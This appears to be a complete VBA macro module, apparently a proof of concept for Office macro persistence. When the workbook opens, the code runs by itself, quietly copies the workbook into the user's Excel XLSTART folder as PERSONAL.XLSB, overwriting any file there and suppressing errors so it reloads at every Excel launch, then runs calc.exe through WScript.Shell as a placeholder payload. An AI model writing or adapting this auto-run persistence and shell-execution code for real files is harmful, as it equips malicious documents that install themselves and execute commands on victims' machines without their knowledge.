Sub Workbook_Open()
    Call Persistence
    Call ExecCalc
End Sub

Sub Persistence()
    Dim fso As Object
    Dim xlStartPath As String
    Dim targetFile As String

    Set fso = CreateObject("Scripting.FileSystemObject")
    xlStartPath = Environ("APPDATA") & "\Microsoft\Excel\XLSTART"
    targetFile = xlStartPath & "\PERSONAL.XLSB"

    If Not fso.FolderExists(xlStartPath) Then Exit Sub
    
    On Error Resume Next
    fso.CopyFile ThisWorkbook.FullName, targetFile, True
    On Error GoTo 0
End Sub

Sub ExecCalc()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "calc.exe", 1
End Sub